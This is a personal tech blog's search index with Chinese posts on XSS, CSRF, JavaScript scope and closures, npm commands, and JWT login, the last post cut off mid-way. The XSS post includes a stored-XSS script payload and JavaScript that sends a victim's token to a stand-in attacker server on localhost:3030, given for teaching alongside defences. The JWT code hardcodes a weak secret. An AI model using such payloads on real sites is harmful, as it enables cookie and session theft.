<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web安全-XSS</title>
      <link href="/2022/09/10/XSS/"/>
      <url>/2022/09/10/XSS/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>参考资料</p><ol><li><a href="https://zhuanlan.zhihu.com/p/340562247" target="_blank" rel="noopener">闲庭信步聊前端 - 漫谈XSS - 知乎 (zhihu.com)</a></li><li><a href="https://zhuanlan.zhihu.com/p/396212876" target="_blank" rel="noopener">什么是XSS 攻击 - 知乎 (zhihu.com)</a></li><li><a href="https://www.bilibili.com/video/BV1My4y1W7DF?p=1" target="_blank" rel="noopener">黑客6小时带你上手web安全攻防、三种漏洞【XSS，CSRF和文件上传】彻底掌握常见web安全漏洞-持续更新中_哔哩哔哩_bilibili</a></li><li><a href="https://zhuanlan.zhihu.com/p/101300360" target="_blank" rel="noopener">XSS的两种攻击方式及五种防御方式 - 知乎 (zhihu.com)</a></li><li><a href="https://blog.csdn.net/weixin_37672169/article/details/104840133" target="_blank" rel="noopener">如何防止XSS攻击？_许文杰的博客-CSDN博客_如何防止xss攻击</a></li></ol><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p><strong>跨站脚本(Cross Site Scripting)</strong>攻击，也称XSS攻击，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，XSS攻击可以获取用户在被攻击网站的信息如cookie，接着就可以利用该cookie去冒充用户本人，进而去进行一些涉及用户隐私的操作。</p><h3 id="造成什么"><a href="#造成什么" class="headerlink" title="造成什么"></a>造成什么</h3><ul><li>获取页面数据</li><li>获取Cookies</li><li>劫持前端逻辑</li><li>发送请求到攻击者自己的网站实现资料的盗取</li><li>偷取网站任意数据</li><li>偷取用户密码和登陆状态</li><li>改变按钮的逻辑</li></ul><h2 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h2><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p><p>具体做法是攻击者将具有恶意攻击代码的信息通过注册或者其他写入数据库的行为发送至后端，这时候被攻击网站如果没有做一些过滤操作，则会将该数据存入数据库中，接着攻击者将使用被攻击网站查询该脚本的url发送给其他该网站的用户，若其他用户误点了该url，则会被攻击者攻击窃取cookie、token等其他数据</p><ol><li><p>如getCookie.js是一段获取当前用户cookie的脚本文件，攻击者在注册某网站或在某网站发表评论的时候，将<code>&lt;script src=&quot;http://localhost:3030/public/getCookie.js&quot;&gt;&lt;/script&gt;</code>进行伪造用户注册或发表评论内容(该文件在攻击者自己服务器上)</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"user": "&lt;script src='http://localhost:3030/public/getCookie.js'&gt;&lt;/script&gt;"</span><br><span class="line">或</span><br><span class="line">"comment": "&lt;script src='http://localhost:3030/public/getCookie.js'&gt;&lt;/script&gt;"</span><br></pre></td></tr></table></figure></li><li><p>数据库将该数据进行存储至数据库</p></li><li><p>假设是comment，当其他正常用户进入该评论有关的页面时，该脚本则会运行并窃取用户cookie</p></li><li><p>假设是user，若有一个用户展示页面需要将所有用户查出来并渲染，那么在该页面上就会被植入该恶意攻击代码，当某一登录的用户访问了用户展示界面，则被攻击</p></li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>假设访问的目标网站被黑客恶意存储了攻击脚本，3030端口的服务器是黑客的，3000端口是正常被访问的网站</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/search'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.query.id == <span class="string">'123'</span>)</span><br><span class="line">    <span class="comment">// 假设id为123是黑客有意存储的一段攻击脚本，脚本被当作用户名存储，如&lt;script src="http://localhost:3030/public/getData.js"&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment">// 服务器查询后将该值发送至前端，这里直接省去数据库查询</span></span><br><span class="line">    <span class="keyword">return</span> res.send(<span class="string">'&lt;script src="http://localhost:3030/public/getData.js"&gt;&lt;/script&gt;'</span>);</span><br><span class="line">  res.send(req.query.id);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>用户访问该查询链接</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.创建ajax对象</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="comment">// 2.告诉Ajax对象要向哪发送请求，以什么方式发送请求</span></span><br><span class="line"><span class="comment">// 1)请求方式 2)请求地址：必须以文件形式访问，否则会产生跨域问题</span></span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'http://localhost:3000/search?id=123'</span>);</span><br><span class="line"><span class="comment">// 3.发送请求</span></span><br><span class="line">xhr.send();</span><br><span class="line"><span class="comment">// 4.获取服务器端响应到客户端的数据(异步)</span></span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> id = xhr.responseText;</span><br><span class="line">p.innerHTML = p.innerHTML + id;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>黑客服务器的getData脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.创建ajax对象</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="comment">// 2.告诉Ajax对象要向哪发送请求，以什么方式发送请求</span></span><br><span class="line"><span class="comment">// 1)请求方式 2)请求地址：必须以文件形式访问，否则会产生跨域问题</span></span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'http://localhost:3030/getData?token='</span> + token);</span><br><span class="line"><span class="comment">// 3.发送请求</span></span><br><span class="line">xhr.send();</span><br><span class="line"><span class="comment">// 4.获取服务器端响应到客户端的数据(异步)</span></span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>黑客拿到token</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/getData'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.query.token);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2022/09/10/XSS/3498fa884cb6bb2eb9487fee88560ce.png" alt="3498fa884cb6bb2eb9487fee88560ce"></p><h4 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h4><p>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。</p><p><img src= "/img/loading.gif" data-src="/2022/09/10/XSS/c669312849b43a8b10415366654af53.png" alt="c669312849b43a8b10415366654af53"></p><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p>通过输入输出两个方向入手，即后端接收数据进行相关操作，或者返回结果的时候进行一些过滤操作</p><ol><li><p><strong>js转义</strong></p><p>如\对数据进行转义处理</p></li><li><p><strong>json</strong></p><p>直接将数据库读取的数据直接以json形式发送给前端，减少后端渲染，让前端渲染去吧</p></li><li><p><strong>使用第三方库XSS防御</strong></p></li><li><p><strong>输入内容长度控制</strong></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重回作用域和闭包</title>
      <link href="/2022/05/15/%E9%87%8D%E5%9B%9E%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85/"/>
      <url>/2022/05/15/%E9%87%8D%E5%9B%9E%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="重回作用域和闭包"><a href="#重回作用域和闭包" class="headerlink" title="重回作用域和闭包"></a>重回作用域和闭包</h1><p>最近阅读了《你不知道的JavaScript上卷》第一章-作用域和闭包，想着怎么也得写个读书笔记，不然不就白看（会忘）了嘛哈哈哈</p><p>闭包在之前b站学过，当时也写了一篇<a href="https://dong-666.github.io/2021/03/06/%E9%97%AD%E5%8C%85/">笔记</a>，这次在这本书中，似乎读出了当时在学的味道，不论是内容、还有顺序，都蛮有一种熟悉感，书和视频一样，都是从作用域（书中是词法作用域）入手，包括预解析，最后再聊到闭包，以及在章末引出下一章的知识点-好多人摸不着头脑的<strong>this</strong>。总的来说，两者一起结合看会让你收获颇丰，视频有着不一样的代码实践和轻松的bgm，以及一些解释性弹幕，可能会让你更快上手，书中则更为详细的讲解了作用域以及变量提升的知识点，从编译器、JavaScript引擎，到变量提升、LHS 和 RHS，专业名词多，但书中也不失幽默，无论是先看视频，还是先看书，都会让你对JavaScript这门语言，不敢说大开，也能’小‘开眼界。</p><p>笔记针对之前所学进行补充</p><h2 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h2><p>程序中的一段源代码在执行之前会经历三个步骤</p><ol><li><p>分词/词法分析（Tokenizing/Lexing）</p><p>这个过程会将由字符组成的字符串分解成（对编程语言来说）有意义的代码块，这些代码块被称为词法单元（token）</p></li><li><p>解析/语法分析（Parsing）</p><p>这个过程是将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法 结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST）</p></li><li><p>代码生成</p><p> AST 转换为可执行代码的过程称被称为代码生成。这个过程与语言、目标平台等息息相关。 抛开具体细节，简单来说就是有某种方法可以将 var a = 2; 的 AST 转化为一组机器指令，用来创建一个叫作 a 的变量（包括分配内存等），并将一个值储存在 a 中。</p></li></ol><h2 id="LHS和RHS"><a href="#LHS和RHS" class="headerlink" title="LHS和RHS"></a>LHS和RHS</h2><blockquote><p>如果查找的目的是对变量进行赋值，那么就会使用 LHS 查询；如果目的是获取变量的值，就会使用 RHS 查询</p></blockquote><p>当引擎执行 LHS 查询时，如果在顶层（全局作用域）中也无法找到目标变量， 全局作用域中就会创建一个具有该名称的变量，并将其返还给引擎，前提是程序运行在非 “严格模式”下。</p><p>LHS 和 RHS 查询都会在当前执行作用域中开始，如果有需要（也就是说它们没有找到所 需的标识符），就会向上级作用域继续查找目标标识符，这样每次上升一级作用域（一层 楼），最后抵达全局作用域（顶层），无论找到或没找到都将停止。</p><h2 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h2><p>JavaScript使用的是词法作用域。</p><blockquote><p>定义：词法作用域就是定义在词法阶段的作用域。换句话说，词法作用域是由你在写代码时将变量和块作用域写在哪里来决定的，因此当词法分析器处理代码时会保持作用域 不变（大部分情况下是这样的）</p></blockquote><p>词法作用域意味着作用域是由书写代码时函数声明的位置来决定的。编译的词法分析阶段 基本能够知道全部标识符在哪里以及是如何声明的，从而能够预测在执行过程中如何对它们进行查找。</p><p><strong>遮蔽效应</strong>：在多层的嵌套作用域中可以定义同名的标识符，这叫作“遮蔽效应”（内部的标识符“遮蔽”了外部的标识符）。</p><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><blockquote><p>定义：JavaScript 中的 eval(..) 函数可以接受一个字符串为参数，并将其中的内容视为好像在书 写时就存在于程序中这个位置的代码。</p></blockquote><p>如果 eval(..) 中所执行的代码包含有一个或多个声明（无论是变量还是函数），就会对 eval(..) 所处的词法作用域进行修改，且是在运行期修改书写期的词法作用域，<strong>这会严重影响性能</strong>，下面介绍的with同理。</p><p>setTimeout(..) 和 setInterval(..) 的第一个参数可以是字符串，字符串的内容可以被解释为一段动态生成的 函数代码。这些功能已经过时且并不被提倡。不要使用它们。</p><h3 id="with"><a href="#with" class="headerlink" title="with"></a>with</h3><p>尽管 with 块可以将一个对象处理为词法作用域，但是这个块内部正常的 var 声明并不会被限制在这个块的作用域中，而是被添加到 with 所处的函数作用域中。</p><p>不推荐使用 eval(..) 和 with 的原因是会被严格模式所影响（限制）。with 被完全禁止，而在保留核心功能的前提下，间接或非安全地使用 eval(..) 也被禁止了。</p><p>JavaScript 引擎会在编译阶段进行数项的性能优化。其中有些优化依赖于能够根据代码的 词法进行静态分析，并预先确定所有变量和函数的定义位置，才能在执行过程中快速找到标识符。</p><p>如果引擎在代码中发现了 eval(..) 或 with，它只能简单地假设关于标识符位置的判断都是无效的，因为无法在词法分析阶段明确知道 eval(..) 会接收到什么代码，这些代码会如何对作用域进行修改，也无法知道传递给 with 用来创建新词法作用域的对象的内容到底是什么。</p><p>总而言之：这两个机制的副作用是引擎无法在编译时对作用域查找进行优化。</p><h2 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h2><p>声明在一个函数内部的变量或函数会在所处的作用域中“隐藏”起来，这是有意为之的良好软件的设计原则。</p><p><strong>最小特权原则</strong>：也叫最小授权或最小暴露原则。这个原则是指在软件设计中，应该最小限度地暴露必 要内容，而将其他内容都“隐藏”起来，比如某个模块或对象的 API 设计</p><h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><p>引擎会在解释 JavaScript 代码之前首先对其进行编译。编译阶段中的一部分工作就是找到所有的 声明，并用合适的作用域将它们关联起来。</p><p>只有声明本身会被提升，而赋值或其他运行逻辑会留在原地。</p><p>函数声明会被提升，但是函数表达式却不会被提升。</p><p><img src= "/img/loading.gif" data-src="/2022/05/15/%E9%87%8D%E5%9B%9E%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85/image-20220428103103715.png" alt="image-20220428103103715"></p><p>var foo 尽管出现在 function foo()… 的声明之前，但它是重复的声明（因此被忽 略了），因为函数声明会被提升到普通变量之前。</p><p>我们习惯将 var a = 2; 看作一个声明，而实际上 JavaScript 引擎并不这么认为。它将 var a 和 a = 2 当作两个单独的声明，第一个是编译阶段的任务，而第二个则是执行阶段的任务。无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。声明本身会被提升，而包括函数表达式的赋值在内的赋值操作并不会提升。</p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><blockquote><p>当函数可以记住并访问所在的词法作用域，即使函数是在当前词法作用域之外执行，这时就产生了闭包。</p></blockquote><ol><li>无论通过何种手段将内部函数传递到所在的词法作用域以外，它都会持有对原始定义作用 域的引用，无论在何处执行这个函数都会使用闭包。</li><li>无论通过何种手段将内部函数传递到所在的词法作用域以外，它都会持有对原始定义作用 域的引用，无论在何处执行这个函数都会使用闭包。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a); <span class="comment">// 2</span></span><br><span class="line">  &#125;</span><br><span class="line">  bar();</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>bar() 对 a 的引用的方法是词法作用域的查找规则，而这些规则只是闭包的一部分。（但却是非常重要的一部分！</p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块模式需要具备两个必要条件</p><ol><li>必须有外部的封闭函数，该函数必须至少被调用一次（每次调用都会创建一个新的模块实例）。</li><li>封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并 且可以访问或者修改私有的状态。</li></ol><p>一个具有函数属性的对象本身并不是真正的模块。从方便观察的角度看，一个从函数调用 所返回的，只有数据属性而没有闭包函数的对象并不是真正的模块。</p><h2 id="动态作用域"><a href="#动态作用域" class="headerlink" title="动态作用域"></a>动态作用域</h2><p>我们知道：JavaScript 中的作用域就是词法作用域。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">3</span>;</span><br><span class="line">  foo();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">bar();</span><br></pre></td></tr></table></figure><p>根据词法作用域，我们知道：词法作用域让 foo() 中的 a 通过 RHS 引用到了全局作用域中的 a，因此会输出 2。</p><p>但是动态作用域并不关心函数和作用域是如何声明以及在何处声明的，只关心它们从何处调 用。换句话说，作用域链是基于调用栈的，而不是代码中的作用域嵌套。因此，上面的foo() 在执行时将会输出 3。因为当 foo() 无法找到 a 的变量引用时，会顺着调用栈在调用 foo() 的地 方查找 a，而不是在嵌套的词法作用域链中向上查找。由于 foo() 是在 bar() 中调用的， 引擎会检查 bar() 的作用域，并在其中找到值为 3 的变量 a。</p><p>他们间的区别是：<strong>词法作用域是在写代码或者说定义时确定的，而动态作用域是在运行时确定 的。（this 也是！）词法作用域关注函数在何处声明，而动态作用域关注函数从何处调用。</strong></p><h2 id="ES5如何创造块作用域"><a href="#ES5如何创造块作用域" class="headerlink" title="ES5如何创造块作用域"></a>ES5如何创造块作用域</h2><p>我们知道在ES6种如何创造块作用域：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(a); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// ReferenceError</span></span><br></pre></td></tr></table></figure><p>但是在ES5中，我们如何去创建块作用域呢，使用catch！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;<span class="keyword">throw</span> <span class="number">2</span>;&#125;<span class="keyword">catch</span>(a)&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// ReferenceError</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全-CSRF</title>
      <link href="/2022/04/22/CSRF/"/>
      <url>/2022/04/22/CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><p>参考资料：</p><ol><li><a href="https://www.cnblogs.com/shanyou/p/5038794.html" target="_blank" rel="noopener">🔺保护ASP.NET 应用免受 CSRF 攻击 - 张善友 - 博客园 (cnblogs.com)</a></li><li><a href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html" target="_blank" rel="noopener">前端安全系列（二）：如何防止CSRF攻击？ - 美团技术团队 (meituan.com)</a></li><li><a href="https://www.bilibili.com/video/BV1iW411171s?spm_id_from=333.337.search-card.all.click" target="_blank" rel="noopener">CSRF 攻击和防御 - Web 安全常识_哔哩哔哩_bilibili,</a></li><li><a href="https://blog.csdn.net/wdquan19851029/article/details/122175054" target="_blank" rel="noopener">SpringSecurity CSRF引发的思考Cookie、Session、Token和JWT_知难行难1985的博客-CSDN博客</a></li></ol><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>CSRF是一种网络的攻击方式，攻击者可以使用该方式盗用你的身份，冒用你的cookie，对被攻击网站发起http请求，以你的名义进行转账等涉及个人财产和隐私安全的行为。</p><h2 id="攻击原理及流程"><a href="#攻击原理及流程" class="headerlink" title="攻击原理及流程"></a>攻击原理及流程</h2><p><img src= "/img/loading.gif" data-src="/2022/04/22/CSRF/510-20151211135009465-914739402.jpg" alt="csrf"></p><p>流程如下</p><ul><li>受害者登录a.com，并保留了登录凭证（Cookie）。</li><li>攻击者引诱受害者访问了b.com。</li><li>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。</li><li>a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</li><li>a.com以受害者的名义执行了act=xx。</li><li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。</li></ul><h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><blockquote><p><strong>疑问：</strong>浏览器对于 cookie 也是存在同源限制的，也就是与 cookie（domain）处于不同源的网站，浏览器是不会让该网站获取到这个 cookie。那为什么csrf攻击是可行的？</p></blockquote><blockquote><p><strong>解答：</strong>原因是浏览器使用 cookie 的情况</p><p>除了跨域 XHR 请求情况下，浏览器在发起请求的时候会把符合要求的 cookie 自动带上。(域名，有效期，路径，secure 属性)，跨域 XHR 的请求的情况下，也可以携带 Cookie。同时浏览器允许跨域提交表单。也就是说，向同一个服务器发请求时会自动带上浏览器保存的对于那个服务器的cookie，而不管你从哪个网站发请求。因为每次请求都会携带在http头上，也是造成带宽浪费的一个原因。但是读取cookie是读取不了的，攻击者没办法知道cookie的内容</p></blockquote><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><ol><li>验证 HTTP Referer 字段<ul><li>它记录了该 HTTP 请求的来源地址</li><li>Referer 的值是由浏览器提供的，可以伪造</li></ul></li><li>在请求地址（表单）中添加 token 并验证（Anti CSRF Token）<ul><li>使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token</li></ul></li><li>在 HTTP 头中自定义属性并验证<ul><li>将token放到 HTTP 头中自定义的属性里</li><li>通过XMLHttpRequest 类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作</li></ul></li><li>验证码验证</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm操作</title>
      <link href="/2022/04/18/NPM%20%E6%93%8D%E4%BD%9C/"/>
      <url>/2022/04/18/NPM%20%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="npm操作"><a href="#npm操作" class="headerlink" title="npm操作"></a>npm操作</h1><p>查看全局安装的npm包： <code>npm list -g -dept 0</code></p><p>解决因node版本过高而引起的依赖安装失败报错问题：<code>npm i --legacy-peer-deps</code> </p><p>清除缓存：<code>npm cache clean</code></p><p>（待补充…）</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node登陆验证之jsonwebtoken</title>
      <link href="/2022/04/15/node-token%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C%E9%AA%8C%E8%AF%81/"/>
      <url>/2022/04/15/node-token%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="使用jsonwebtoken进行node端登陆注册验证"><a href="#使用jsonwebtoken进行node端登陆注册验证" class="headerlink" title="使用jsonwebtoken进行node端登陆注册验证"></a>使用jsonwebtoken进行node端登陆注册验证</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><strong>简介</strong>：Token在计算机身份认证中是<a href="https://baike.baidu.com/item/令牌/9716092" target="_blank" rel="noopener">令牌</a>（临时）的意思，在词法分析中是标记的意思。一般作为邀请、登录系统使用。</p><p>Token 是在服务端产生的。如果前端使用用户名/密码向服务端请求认证，服务端认证成功，那么在服务端会返回 Token 给前端。前端可以在每次请求的时候带上 Token 证明自己的合法地位。如果这个 Token 在服务端持久化（比如存入数据库），那它就是一个永久的身份令牌（<a href="https://www.cnblogs.com/xuxinstyle/p/9675541.html" target="_blank" rel="noopener">参考资料</a>）</p></blockquote><h3 id="为什么使用它"><a href="#为什么使用它" class="headerlink" title="为什么使用它"></a>为什么使用它</h3><p>token解决的问题如下</p><ol><li>Token 完全由应用管理，所以它可以避开同源策略</li><li>Token 可以避免 <a href="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fwww.cnblogs.com%2Fshanyou%2Fp%2F5038794.html" target="_blank" rel="noopener">CSRF 攻击</a>（又引出一个知识点，推荐<a href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html" target="_blank" rel="noopener">文章</a>，<strong>前端知识真是如同太平洋广，如同马里亚纳海沟深</strong>）</li><li>Token 可以是无状态的，可以在多个服务间共享</li></ol><h3 id="其它（cookie、session、token）"><a href="#其它（cookie、session、token）" class="headerlink" title="其它（cookie、session、token）"></a>其它（cookie、session、token）</h3><p>本实验主要采用token进行前后端验证，但是同时也有必要了解其他验证方式的原理，推荐看看下面的文章</p><blockquote><p>博客链接：<a href="https://juejin.cn/post/6898630134530752520" target="_blank" rel="noopener">🔺🔺🔺前端鉴权的兄弟们：cookie、session、token、jwt、单点登录 - 掘金 (juejin.cn)</a>，通过该博客，你可了解到</p><ol><li>基于 HTTP 的前端鉴权背景</li><li>cookie 为什么是最方便的存储方案，有哪些操作 cookie 的方式</li><li>session 方案是如何实现的，存在哪些问题</li><li>token 方案是如何实现的，如何进行编码和防篡改？jwt 是做什么的？refresh token 的实现和意义</li><li>session 和 token 有什么异同和优缺点</li><li>单点登录是什么？实现思路和在浏览器下的处理</li></ol></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>参考视频（强烈建议看，逻辑清晰，几乎不带一句废话，虽然有点长）:<a href="https://www.bilibili.com/video/BV1Nb411j7AC?spm_id_from=333.337.search-card.all.click" target="_blank" rel="noopener">1小时搞定NodeJs(Express)的用户注册、登录和授权_哔哩哔哩_bilibili🔺🔺🔺</a></p><p>步骤（该案例模拟的用户名为唯一值unique）</p><ol><li><p>相关模块以及初始化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>); <span class="comment">//expree服务器</span></span><br><span class="line"><span class="keyword">const</span> bcrypt = <span class="built_in">require</span>(<span class="string">'bcrypt'</span>); <span class="comment">//加密</span></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>); <span class="comment">//token</span></span><br><span class="line"><span class="keyword">const</span> User = <span class="built_in">require</span>(<span class="string">'./User.js'</span>); <span class="comment">//用户模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="comment">// 定义密钥进行token加密，也可通过openssl进行私钥公钥配对,后面有解释</span></span><br><span class="line"><span class="keyword">let</span> SECRET = <span class="string">'dongyuan666'</span>;</span><br><span class="line"><span class="comment">// 接收前端传递的json数据</span></span><br><span class="line">app.use(express.json());</span><br></pre></td></tr></table></figure></li><li><p>用户名唯一，密码加密(User模块)</p><ul><li>bcrypt模块 -&gt; set函数 -&gt; <code>bcrypt.hashSync(val, 